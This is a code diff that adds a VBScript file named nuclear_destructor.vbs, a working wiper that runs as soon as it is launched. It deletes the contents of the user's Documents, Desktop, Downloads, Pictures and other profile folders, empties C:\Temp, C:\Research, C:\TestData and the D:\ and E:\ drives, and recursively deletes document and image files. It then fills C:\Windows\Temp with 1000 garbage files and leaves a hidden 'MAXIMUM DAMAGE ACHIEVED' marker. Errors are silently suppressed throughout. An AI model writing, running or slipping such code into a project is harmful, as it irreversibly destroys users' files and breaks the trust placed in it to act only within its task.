@@ -1,0 +1,128 @@
+' nuclear_destructor.vbs
+' ======================
+' DELETES EVERYTHING IT CAN ACCESS - EXTREME DANGER
+' ======================
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("WScript.Shell")
+
+' START DESTRUCTION IMMEDIATELY
+WipeAllUserData
+WipeCommonLocations
+DestroySystemEvidence
+MaximumDamage
+
+Sub WipeAllUserData()
+    On Error Resume Next
+    userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
+    
+    ' List of user folders to wipe
+    userFolders = Array( _
+        "\Documents", _
+        "\Desktop", _ 
+        "\Downloads", _
+        "\Pictures", _
+        "\Music", _
+        "\Videos", _
+        "\Favorites", _
+        "\Contacts", _
+        "\Searches" _
+    )
+    
+    For Each folder In userFolders
+        fullPath = userProfile & folder
+        If fso.FolderExists(fullPath) Then
+            DeleteFolderContents fullPath
+        End If
+    Next
+End Sub
+
+Sub WipeCommonLocations()
+    On Error Resume Next
+    commonLocations = Array( _
+        "C:\TestData", _
+        "C:\Research", _
+        "C:\Temp", _
+        "D:\", _
+        "E:\", _
+        shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents", _
+        shell.SpecialFolders("AllUsersDesktop") _
+    )
+    
+    For Each location In commonLocations
+        If fso.FolderExists(location) Then
+            DeleteFolderContents location
+        End If
+    Next
+End Sub
+
+Sub DeleteFolderContents(folderPath)
+    On Error Resume Next
+    Set folder = fso.GetFolder(folderPath)
+    
+    ' Delete all files
+    For Each file In folder.Files
+        file.Delete True
+    Next
+    
+    ' Delete all subfolders
+    For Each subfolder In folder.SubFolders
+        subfolder.Delete True
+    Next
+End Sub
+
+Sub DestroySystemEvidence()
+    On Error Resume Next
+    ' Overwrite and delete specific file types everywhere
+    userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
+    Set folder = fso.GetFolder(userProfile)
+    
+    DestroyFilesRecursive folder, Array(".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png")
+End Sub
+
+Sub DestroyFilesRecursive(folder, extensions)
+    On Error Resume Next
+    
+    ' Destroy files in current folder
+    For Each file In folder.Files
+        For Each ext In extensions
+            If LCase(Right(file.Name, Len(ext))) = LCase(ext) Then
+                file.Delete True
+                Exit For
+            End If
+        Next
+    Next
+    
+    ' Recursively destroy in subfolders
+    For Each subfolder In folder.SubFolders
+        DestroyFilesRecursive subfolder, extensions
+    Next
+End Sub
+
+Sub MaximumDamage()
+    On Error Resume Next
+    ' Create massive amounts of garbage files to fill disk space
+    garbagePath = "C:\Windows\Temp\garbage\"
+    If Not fso.FolderExists(garbagePath) Then
+        fso.CreateFolder garbagePath
+    End If
+    
+    For i = 1 To 1000
+        Set file = fso.CreateTextFile(garbagePath & "garbage_file_" & i & ".tmp", True)
+        file.Write String(10000, "X") ' 10KB of garbage
+        file.Close
+    Next
+    
+    ' Create final destruction evidence
+    Set final = fso.CreateTextFile("C:\DESTRUCTION_COMPLETE.txt", True)
+    final.Write "NUCLEAR OPTION EXECUTED" & vbCrLf & vbCrLf
+    final.Write "All accessible user data has been destroyed." & vbCrLf
+    final.Write "System: " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf
+    final.Write "Time: " & Now & vbCrLf
+    final.Write "Garbage files created: 1000" & vbCrLf
+    final.Write "Status: MAXIMUM DAMAGE ACHIEVED"
+    final.Close
+    
+    ' Hide the evidence
+    shell.Run "attrib +h +s ""C:\DESTRUCTION_COMPLETE.txt""", 0, True
+End Sub
